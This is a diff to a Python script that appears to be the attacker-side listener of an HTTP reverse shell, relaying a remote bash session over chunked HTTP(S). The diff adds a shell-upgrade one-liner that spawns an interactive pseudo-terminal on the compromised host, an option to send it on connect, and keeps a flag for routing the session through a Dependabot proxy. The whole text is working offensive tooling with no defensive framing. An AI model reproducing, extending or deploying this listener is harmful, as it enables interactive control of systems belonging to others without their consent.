@@ -9,11 +9,15 @@ import sys
 import select
 import threading
 import os
+import tty
+import termios
 from collections import defaultdict
 
 # inspired by: https://stackoverflow.com/questions/29023885/python-socket-readline-without-socket-makefile
 import socket
 from asyncio import IncompleteReadError  # only import the exception class
+
+PTY_UPGRADE_CMD = "p=$(which python || which python3); s=$(which bash || which sh); if [ -n $p ]; then exec $p -c 'import pty;pty.spawn(\"'$s'\")'; fi"
 
 class SocketStreamReader:
     def __init__(self, sock: socket.socket):
@@ -94,6 +98,7 @@ def locker(c, d, should_exit):
     finally:
         lock.release()
 
+
 class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
 
     # this is receiving the output of the bash process on the remote end and prints it to the local terminal
@@ -120,6 +125,13 @@ class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
         self.server.should_exit = True
         locker(w, -1, not self.server.args.serve_forever)
 
+    def _feed(self, data):
+        if self.server.args.dependabot_workaround:
+            self.wfile.write(data.encode())
+            self.wfile.flush()
+        else:
+            self._send_chunk(data)
+
     # this is feeding the bash process on the remote end with input typed in the local terminal
     def do_POST(self):
         eprint("stdin stream connected")
@@ -127,28 +139,28 @@ class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
         self.send_header('Content-Type', "application/binary")
         self.send_header('Transfer-Encoding', 'chunked')
         self.end_headers()
-        
+
         locker("stdin", 1, not self.server.args.serve_forever)
-        
+
+        if self.server.args.upgrade_pty:
+            eprint(PTY_UPGRADE_CMD)
+            self._feed(PTY_UPGRADE_CMD+"\n")
+
         while True:
             s = select.select([sys.stdin, self.request], [], [], 1)[0]
             if self.server.should_exit:
                 break
             if self.request in s:
-                # input broke
+                # input broken
                 break
             if sys.stdin in s:
-                line = sys.stdin.readline()
-                if self.server.args.dependabot_workaround:
-                    self.wfile.write(line.encode())
-                    self.wfile.flush()
-                else:
-                    self._send_chunk(line)
+                data = sys.stdin.readline()
+                self._feed(data)
         self._send_chunk("")
         eprint("stdin stream closed")
-        
+
         locker("stdin", -1, not self.server.args.serve_forever)
-        
+
     def do_GET(self):
         eprint("cmd request received from", self.client_address)
         schema = "https" if self.server.args.certificate else "http"
@@ -188,9 +200,9 @@ def do_the_job(args):
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER )
         context.load_cert_chain(args.certificate, args.private_key)
         httpd.socket = context.wrap_socket(httpd.socket)
-        eprint("https listener starting")
+        eprint(f"https listener starting {args.listen_host}:{args.listen_port}")
     else:
-        eprint("plain http listener starting")
+        eprint(f"plain http listener starting {args.listen_host}:{args.listen_port}")
 
     #  handle_request()
     httpd.serve_forever()
@@ -202,6 +214,7 @@ if __name__ == "__main__":
     parser.add_argument("--certificate", help="path to the certificate for TLS")
     parser.add_argument("--listen-host", default="0.0.0.0", help="host to listen on")
     parser.add_argument("--listen-port", type=int, default=443, help="port to listen on")
-    parser.add_argument("--serve-forever", type=bool, default=False, action='store_true', help="whether the server should exit after processing a session (just like nc would)")
-    parser.add_argument("--dependabot-workaround", type=bool, action='store_true', default=False, help="transfer-encoding support in the dependabot proxy is broken, it rewraps the raw chunks. This is a workaround.")
+    parser.add_argument("--serve-forever", default=False, action='store_true', help="whether the server should exit after processing a session (just like nc would)")
+    parser.add_argument("--dependabot-workaround", action='store_true', default=False, help="transfer-encoding support in the dependabot proxy is broken, it rewraps the raw chunks. This is a workaround.")
+    parser.add_argument("--upgrade-pty", action='store_true', default=False, help=f"When a connection is established, attempt to invoke python to create a pseudo-terminal to improve the shell experience.")
     do_the_job(parser.parse_args())
